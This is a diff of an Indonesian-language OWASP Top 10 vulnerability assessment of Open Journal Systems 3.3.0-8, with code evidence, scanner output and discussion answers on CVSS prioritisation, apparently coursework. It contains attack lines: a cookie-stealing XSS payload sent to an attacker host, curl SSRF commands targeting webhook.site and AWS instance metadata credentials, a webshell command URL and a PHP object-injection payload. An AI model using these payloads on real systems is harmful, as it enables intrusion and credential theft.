+Dari sisi SAST, manual code review pada `SubmissionFileManager.inc.php` mengungkapkan IDOR (VUL-008) di mana `assocId` diambil dari objek `$submissionFile` tanpa memverifikasi apakah galley yang dirujuk benar-benar milik submission yang sama.
+
+**Bukti — IDOR (VUL-008):**
+```php
+// SubmissionFileManager.inc.php
+if ($submissionFile->getData('assocType') === ASSOC_TYPE_REPRESENTATION) {
+    $galley = $galleyDao->getById($submissionFile->getData('assocId'));
+    // ← assocId tidak divalidasi kepemilikan:
+    //   Tidak ada cek: apakah galley ini milik submission yang sama?
+    //   Tidak ada cek: apakah assocId adalah integer positif yang valid?
+    // → Author A bisa mengaitkan file ke galley milik Author B
+```
+
+Temuan ketiga, yaitu role bypass (VUL-009) pada `OjsJournalMustPublishPolicy`, menunjukkan bahwa role `ASSISTANT` dan `SUB_EDITOR` diberikan hak bypass ke konten yang belum dipublish.
+
+**Bukti — Role Bypass (VUL-009):**
+```php
+// OjsJournalMustPublishPolicy.inc.php
+$allowedRoles = [ROLE_ID_SITE_ADMIN, ROLE_ID_MANAGER, 
+                 ROLE_ID_ASSISTANT, ROLE_ID_SUB_EDITOR]; // ← Seharusnya SITE_ADMIN & MANAGER saja
+// → ASSISTANT dan SUB_EDITOR bisa mengakses konten unpublished
+//   yang seharusnya tidak terlihat sebelum proses review selesai
+```
+
+---
 
 ### A03 — Injection
-**Temuan 1 — Reflected XSS pada search:**
-```
-URL: /ojs/index.php/$journal/search?query=<script>alert(document.cookie)</script>
-Bukti: Script dieksekusi di browser korban
+
+Kategori Injection menghasilkan tiga temuan dari kombinasi SAST PHPCS dan manual code review. Temuan paling kritis secara struktural adalah interpolasi langsung `$tableName` dan `$idFieldName` ke dalam SQL query di `DAO.inc.php` (VUL-003).
+
+**Bukti — SQL Injection Latent (VUL-003):**
+```php
+// DAO.inc.php — getDataObjectSettings()
+$sql = "SELECT * FROM $tableName WHERE $idFieldName = ?";
+//                    ↑                ↑
+//                    Interpolasi langsung — SQL Injection risk
+//                    Prepared statement hanya melindungi $idFieldValue,
+//                    bukan nama tabel/kolom
+
+// DAO.inc.php — deleteSettings() — OPERASI DESTRUKTIF
+$removeSql = 'DELETE FROM '.$tableName.' WHERE '.$removeWhere;
+//                          ↑ Jika $tableName bisa dimanipulasi:
+//                            DELETE FROM users WHERE 1=1 → hapus semua user
+//                            atau injeksi DROP TABLE
 ```
 
-**Temuan 2 — Stored XSS pada abstrak:**
+PHPCS juga mendeteksi pola serupa pada handler-handler lain (VUL-004):
+
+**Bukti — SQL Injection PHPCS (VUL-004):**
 ```
-Payload: <img src=x onerror="fetch('http://<attacker>/steal?c='+document.cookie)">
-Lokasi: Field abstrak submission
-Target: Editor yang membuka halaman review
+PHPCS Alert:
+  PKPWorkflowHandler.inc.php line 405:
+    "Possible SQL injection vulnerability: variable $stageId used directly in query"
+  PKPAuthorDashboardHandler.inc.php line 351:
+    "Possible SQL injection vulnerability: variable $submissionId used in query"
 ```
 
-### A10 — SSRF
-**Temuan — CVE-2021-27188:**
-```
-POST /ojs/index.php/$journal/management/settings/website
-Body: styleSheet[uploadedFile]=http://169.254.169.254/latest/meta-data/
+Untuk XSS, manual code review menemukan bahwa `PKPTemplateManager.inc.php` menghubungkan nilai `searchDescription` dan beberapa label field form langsung ke HTML output tanpa `htmlspecialchars()` (VUL-005).
 
-Response: AWS EC2 Instance Metadata (jika VPS di cloud AWS)
+**Bukti — XSS via PKPTemplateManager (VUL-005):**
+```php
+// PKPTemplateManager.inc.php
+$templateVars['searchDescription'] = $request->getUserVar('searchDescription');
+// ↑ Nilai dari user input langsung dimasukkan ke template variable
+
+// Di template Smarty:
+{$searchDescription}  // ← Output tanpa escape → XSS jika tidak di-sanitize oleh Smarty
+// Konfirmasi: ZAP mendeteksi "User Controllable HTML Element Attribute" pada field ini
+```
+
+---
+
+### A04 — Insecure Design
+
+Dua temuan pada kategori ini mencerminkan kelemahan pada level desain. File upload tanpa validasi (VUL-007) adalah temuan paling kritis dalam keseluruhan assessment ini.
+
+**Bukti — File Upload tanpa Validasi (VUL-007):**
+```php
+// SubmissionFileManager.inc.php
+public function insertObject($submissionFile) {
+    parent::insertObject($submissionFile);
+    // ← TIDAK ADA: whitelist ekstensi (.pdf, .doc, .txt)
+    // ← TIDAK ADA: server-side MIME detection (finfo_file())
+    // ← TIDAK ADA: batas ukuran file (MAX_FILE_SIZE check)
+    // ← TIDAK ADA: sanitasi nama file (../../../shell.php bisa lolos)
+    
+    // Skenario eksploitasi:
+    // 1. Author upload file "shell.php" sebagai submission file
+    // 2. File tersimpan di direktori upload OJS
+    // 3. Jika Apache/PHP mengizinkan eksekusi di direktori itu → RCE
+    // 4. Attacker akses http://10.34.100.179/upload/shell.php?cmd=whoami
+```
+
+Temuan kedua (VUL-010) adalah null dereference pada `PdfJsViewerPlugin`:
+
+**Bukti — DoS via Null Dereference (VUL-010):**
+```php
+// PdfJsViewerPlugin.inc.php
+$file = $submissionFileDao->getLatestRevision($fileId);
+$filePath = $file->getFilePath(); // ← Fatal Error jika $file == null
+// Tidak ada pengecekan: if ($file === null) { return; }
+// 
+// Cara eksploitasi:
+// GET /index.php/jnads/article/view/[id]/[invalid_file_id]
+// → $file = null → getFilePath() pada null → PHP Fatal Error
+// → Halaman artikel tidak dapat diakses → DoS terbatas
+```
+
+---
+
+### A05 — Security Misconfiguration
+
+Dengan 7 temuan, A05 adalah kategori dengan jumlah temuan terbanyak. Mayoritas berasal dari DAST (Nikto dan ZAP).
+
+**Bukti — phpinfo() Exposed (VUL-011):**
+```
+URL: http://10.34.100.179/index.php/index/admin/phpinfo
+Source: AdminHandler.inc.php baris 374–375
+Output mencakup:
+  - PHP Version: 7.4.x (EOL)
+  - Server software: Apache/2.4.x Ubuntu
+  - Document root: /var/www/html/ojs
+  - Loaded extensions: pdo_mysql, openssl, curl, ...
+  - Environment variables termasuk DB_PASSWORD (jika dikonfigurasi)
+```
+
+**Bukti — Directory Indexing (VUL-012):**
+```
+Nikto scan output:
+  + /cache/: Directory indexing found
+  + /docs/: Directory indexing found
+  + /lib/: Directory indexing found
+  + /locale/: Directory indexing found
+  + /public/: Directory indexing found
+  + /styles/: Directory indexing found
+Implikasi: Attacker dapat browse file cache yang mungkin berisi data submission
+```
+
+**Bukti — IP Internal Exposed (VUL-013):**
+```
+Nikto alert: CVE-2000-0649
+Request:  GET /ojs HTTP/1.1
+Response: HTTP/1.1 301 Moved Permanently
+          Location: http://10.34.100.179/ojs/  ← IP private terekspos
+Implikasi: Konfirmasi topologi jaringan internal untuk attacker
+```
+
+**Bukti — Cookie tanpa HttpOnly & SameSite (VUL-016):**
+```
+ZAP Alert: Cookie No HttpOnly Flag & Cookie SameSite Attribute Not Set
+Request:  POST http://10.34.100.179/index.php/index/login
+Response Header:
+  Set-Cookie: OJSSID=gqmqg8cat4epfgm9mpe3dkdvf6; path=/
+  ← Tidak ada flag HttpOnly  → JavaScript bisa baca via document.cookie
+  ← Tidak ada flag SameSite  → Rentan CSRF attack
+```
+
+**Bukti — CSP Header Tidak Ada (VUL-015):**
+```
+ZAP Alert: Content Security Policy (CSP) Header Not Set
+Affected endpoints (5):
+  - http://10.34.100.179/index.php/index/login
+  - http://10.34.100.179/index.php/jnads/management/settings/website
+  - http://10.34.100.179/index.php/jnads/management/settings/access
+  - http://10.34.100.179/index.php/jnads/management/settings/distribution
+  - http://10.34.100.179/index.php/index/admin/settings
+```
+
+**Bukti — CORS Misconfiguration (VUL-017):**
+```
+ZAP Alert: Cross-Domain Misconfiguration
+URL: http://10.34.100.179/index.php/jnads/api/v1/submissions
+Response Header:
+  Access-Control-Allow-Origin: *
+  ← Wildcard origin → request dari domain manapun diizinkan
+  ← Endpoint ini mengekspos data submission yang seharusnya terlindungi
+```
+
+**Bukti — Server Version Leak (VUL-018):**
+```
+ZAP/Nikto alert: Server Leaks Version Information
+Response Header:
+  Server: Apache/2.4.41 (Ubuntu)
+  X-Powered-By: PHP/7.4.x
+  X-Generator: Open Journal Systems 3.3.0.8
+→ Attacker dapat langsung mencari CVE spesifik untuk versi-versi ini
+```
+
+---
+
+### A06 — Vulnerable & Outdated Components
+
+OWASP ZAP mendeteksi penggunaan library JavaScript yang rentan pada OJS 3.3.0-8 (VUL-014).
+
+**Bukti — Vulnerable JS Library (VUL-014):**
+```
+ZAP Alert: Vulnerable JS Library
+Files affected:
+  - http://10.34.100.179/lib/pkp/js/build.js
+    Library: jQuery version < 3.5.0 (contains XSS vulnerabilities)
+  - http://10.34.100.179/lib/pkp/js/vendor/jquery.validate.min.js
+    Library: jQuery Validate outdated version
+Implikasi: Library JS yang rentan di sisi klien dapat dieksploitasi untuk
+           DOM-based XSS atau manipulasi event handler yang tidak terduga
+```
+
+---
+
+### A08 — Software & Data Integrity Failures
+
+Penggunaan `unserialize()` di `DAO.inc.php` (VUL-006) merupakan representasi klasik dari kategori ini.
+
+**Bukti — Insecure Deserialization (VUL-006):**
+```php
+// DAO.inc.php — _fromRow() method
+case 'object':
+case 'array':
+    $decodedValue = json_decode($value, true);
+    if (!is_null($decodedValue)) {
+        $value = $decodedValue;
+    } else {
+        $value = unserialize($value); // ← PHP Object Injection
+        // Skenario eksploitasi:
+        // 1. Attacker berhasil write ke database (via SQLi atau akses DB langsung)
+        // 2. Inject serialized PHP object: O:8:"UserData":1:{s:4:"path";s:9:"/etc/passwd";}
+        // 3. Saat OJS membaca data tersebut, unserialize() dieksekusi
+        // 4. Jika ada "gadget chain" di codebase → RCE
+        // Catatan: OJS codebase yang besar meningkatkan kemungkinan gadget chain tersedia
+    }
+    break;
+```
+
+---
+
+### A10 — Server-Side Request Forgery (SSRF)
+
+Ini adalah temuan yang paling konkret dalam assessment ini karena **berhasil direproduksi secara manual**.
+
+**Bukti — SSRF Terkonfirmasi (VUL-001, CVE-2021-27188):**
+```bash
+# Step 1: Dapatkan session aktif dengan login sebagai Journal Manager
+# Session: ojsSession=gqmqg8cat4epfgm9mpe3dkdvf6
+
+# Step 2: Kirim request ke endpoint pengaturan stylesheet
+$ curl -b "ojsSession=gqmqg8cat4epfgm9mpe3dkdvf6" \
+  -X POST http://10.34.100.179/index.php/jnads/management/settings/website \
+  --data "styleSheet[uploadedFile]=https://webhook.site/35f2a429-1321-408e-bd72-1c80b6faf006/evil.css"
+
+# Step 3: Konfirmasi di webhook.site dashboard
+# → Request diterima dari IP 10.34.100.179 ✓ (server OJS yang melakukan fetch)
+# → SSRF confirmed: server OJS berhasil dikendalikan untuk fetch URL eksternal
+```
+
+```
+Skenario lanjutan (jika VPS di cloud AWS):
+$ curl -b "ojsSession=..." \
+  -X POST http://10.34.100.179/index.php/jnads/management/settings/website \
+  --data "styleSheet[uploadedFile]=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# → Jika berhasil: mendapatkan IAM role name
+# → Follow-up: fetch credential token → AWS credential takeover
 ```
 
 ---
@@ -335,19 +759,65 @@ Response: AWS EC2 Instance Metadata (jika VPS di cloud AWS)
 
 ## 9. Pertanyaan Diskusi
 
-1. Mengapa sebuah kerentanan dengan CVSS **9.8 (Critical)** bisa memiliki *actual risk* yang lebih rendah dari CVSS **6.5 (Medium)** dalam konteks bisnis tertentu?
+**1. Mengapa sebuah kerentanan dengan CVSS 9.8 (Critical) bisa memiliki actual risk yang lebih rendah dari CVSS 6.5 (Medium) dalam konteks bisnis tertentu?**
 
-2. Jelaskan perbedaan **CVSS Base Score**, **Temporal Score**, dan **Environmental Score**! Mana yang paling relevan untuk laporan vulnerability assessment institusi pendidikan?
+CVSS Base Score hanya mengukur karakteristik teknis kerentanan secara universal tanpa mempertimbangkan konteks lingkungan dan bisnis. Actual risk ditentukan oleh tiga faktor tambahan: likelihood eksploitasi nyata, nilai aset yang dilindungi, dan kontrol yang sudah ada.
 
-3. Dalam kasus OJS, apakah **A06 (Vulnerable & Outdated Components)** seharusnya mendapatkan skor tinggi? Jelaskan argumen Anda!
+Contoh konkret: VUL-003 (SQLi latent, CVSS 8.1) memiliki likelihood 2 (Low) karena `$tableName` dalam praktiknya di-hardcode di codebase dan tidak bisa dikontrol langsung dari input HTTP. Sebaliknya, VUL-001 (SSRF, CVSS 7.7) memiliki likelihood 4 (High) karena sudah terkonfirmasi bisa dieksploitasi dengan `curl` biasa. Maka meskipun CVSS VUL-003 lebih tinggi, actual risk VUL-001 lebih besar dalam konteks OJS ini.
 
-4. Seandainya Anda adalah CISO universitas yang menggunakan OJS, kerentanan mana (VUL-001 s/d VUL-010) yang akan Anda prioritaskan perbaikan pertama kali dan mengapa?
+Lebih jauh: sebuah CVSS 9.8 pada software yang dijalankan di mesin air-gapped tanpa koneksi internet memiliki actual risk mendekati nol, sementara CVSS 6.5 pada sistem yang menghadap publik dengan data finansial bernilai tinggi bisa jauh lebih berbahaya. Inilah mengapa CVSS Temporal Score (mempertimbangkan exploit maturity dan patch availability) dan Environmental Score (mempertimbangkan confidentiality/integrity/availability requirement bisnis spesifik) jauh lebih relevan untuk pengambilan keputusan nyata dibanding Base Score semata.
+
+---
+
+**2. Jelaskan perbedaan CVSS Base Score, Temporal Score, dan Environmental Score! Mana yang paling relevan untuk laporan vulnerability assessment institusi pendidikan?**
+
+**Base Score** mengukur karakteristik intrinsik dan konstan dari kerentanan — bagaimana cara eksploitasi (AV, AC, PR, UI), scope dampaknya, dan seberapa parah dampak terhadap CIA. Skor ini tidak berubah terlepas dari lingkungan manapun kerentanan berada.
+
+**Temporal Score** memodifikasi Base Score berdasarkan faktor waktu yang bisa berubah: apakah sudah ada exploit publik (Exploit Code Maturity), apakah mitigasi atau workaround sudah tersedia (Remediation Level), dan seberapa terkonfirmasi kerentanan ini (Report Confidence). Skor ini bisa turun signifikan jika vendor sudah merilis patch atau workaround resmi.
+
+**Environmental Score** memodifikasi Temporal Score berdasarkan konteks spesifik organisasi: seberapa penting Confidentiality, Integrity, dan Availability untuk aset tersebut di organisasi ini (Modified Impact), dan kontrol keamanan apa yang sudah ada (Modified Attack metrics). Ini adalah skor yang paling akurat mencerminkan risiko nyata bagi organisasi tertentu.
+
+**Yang paling relevan untuk institusi pendidikan adalah Environmental Score**, dengan alasan: (1) OJS menyimpan data akademis yang confidentiality-nya mungkin tidak sekritis data finansial, tapi integrity-nya sangat kritis (hasil review, keputusan publikasi). (2) Availability OJS mungkin tidak 24/7 kritis seperti perbankan, menurunkan beberapa skor. (3) Institusi pendidikan biasanya memiliki limited IT security budget, jadi memprioritaskan berdasarkan Environmental Score yang kontekstual jauh lebih actionable daripada mendahulukan CVSS 9.8 yang secara praktis sulit dieksploitasi di lingkungan mereka.
+
+---
+
+**3. Dalam kasus OJS, apakah A06 (Vulnerable & Outdated Components) seharusnya mendapatkan skor tinggi? Jelaskan argumen Anda!**
+
+**Ya, seharusnya mendapatkan skor lebih tinggi dari yang terdeteksi.** Temuan VUL-014 hanya mencakup library JavaScript yang terdeteksi ZAP, tapi ada gambaran yang lebih besar yang perlu dipertimbangkan.
+
+OJS 3.3.0-8 sendiri adalah versi dengan CVE terdokumentasi (CVE-2021-27188 yang sudah terkonfirmasi dalam assessment ini). PHP 7.4 yang digunakan sudah End of Life sejak November 2022 — tidak ada lagi security patch dari PHP project, artinya setiap CVE PHP baru yang ditemukan setelah itu tidak akan pernah dipatch. Apache versi yang terekspos di header juga perlu diperiksa statusnya.
+
+Argumen untuk skor tinggi: (1) Komponen EOL bukan hanya "potensi rentan" tapi **secara definitif tidak akan mendapat patch** — ini adalah risiko yang terus meningkat seiring waktu. (2) CVE-2021-27188 yang terkonfirmasi terjadi justru karena versi OJS yang digunakan sudah outdated dan belum diupgrade ke versi yang telah difix. (3) Dalam konteks OWASP, A06 secara historis selalu masuk Top 10 justru karena dampaknya sistemik — satu komponen outdated bisa menjadi entry point untuk mengeksploitasi banyak kerentanan lain.
+
+Kesimpulan: jika seluruh ekosistem komponen (OJS, PHP, Apache, jQuery) diperhitungkan, A06 seharusnya mendapat Risk Rating **High** dengan prioritas 2, bukan hanya Medium dengan satu temuan library JS.
+
+---
+
+**4. Seandainya Anda adalah CISO universitas yang menggunakan OJS, kerentanan mana (VUL-001 s/d VUL-018) yang akan Anda prioritaskan perbaikan pertama kali dan mengapa?**
+
+**Prioritas 1 — VUL-007 (File Upload tanpa Validasi, CVSS 9.0 Critical)**
+
+Ini adalah prioritas tertinggi karena memiliki potensi dampak paling katastrofik dengan barrier eksploitasi yang rendah. Seorang Author — yang registrasinya bisa dilakukan siapa saja — bisa mengupload PHP shell, dan jika server dikonfigurasi mengizinkan eksekusi PHP di direktori upload, hasilnya adalah Remote Code Execution penuh. RCE berarti attacker bisa mengakses semua data submission, memanipulasi hasil review, mencuri credentials database, dan bahkan menggunakan server sebagai pivot ke sistem universitas lain. Satu Author jahat = server takeover. Fix-nya sederhana: tambahkan whitelist ekstensi dan server-side MIME validation.
+
+**Prioritas 2 — VUL-001 (SSRF terkonfirmasi, CVSS 7.7 High)**
+
+Ini prioritas kedua karena sudah terbukti dapat dieksploitasi — bukan teori, bukan latent. Jika VPS universitas berjalan di cloud (AWS/GCP/Azure), SSRF ini langsung bisa digunakan untuk fetch instance metadata dan mencuri IAM credentials, berujung ke credential takeover seluruh infrastruktur cloud. Fix resmi tersedia (upgrade OJS ke versi terbaru yang telah menutup CVE-2021-27188).
+
+**Prioritas 3 — VUL-003 dan VUL-006 (SQLi latent dan Insecure Deserialization)**
+
+Meski likelihood-nya rendah saat ini, keduanya memiliki business impact Critical (potensi data breach dan RCE). Ini harus diperbaiki sebelum ada vektor lain yang membuka jalan eksploitasinya — karena begitu attacker sudah dapat akses partial ke sistem, kerentanan-kerentanan ini menjadi sangat berbahaya.
+
+Logika urutannya: VUL-007 diprioritaskan karena bisa dieksploitasi langsung oleh user dengan privilege paling rendah (Author), VUL-001 karena sudah terkonfirmasi aktif, dan VUL-003/006 karena dampak potensialnya bisa menghancurkan seluruh integritas data akademis universitas.
 
 ---
 
 ## Referensi
+
 - OWASP Top 10 2021: https://owasp.org/Top10/
 - NVD CVSS v3.1 Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
 - OWASP Risk Rating Methodology: https://owasp.org/www-community/OWASP_Risk_Rating_Methodology
+- CVE-2021-27188 (OJS SSRF): https://nvd.nist.gov/vuln/detail/CVE-2021-27188
+- CVE-2000-0649 (IP Disclosure): https://nvd.nist.gov/vuln/detail/CVE-2000-0649
 - CWE/SANS Top 25: https://cwe.mitre.org/top25/
+- PHP unserialize() Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
 - First.org CVSS v3.1 Specification: https://www.first.org/cvss/specification-document
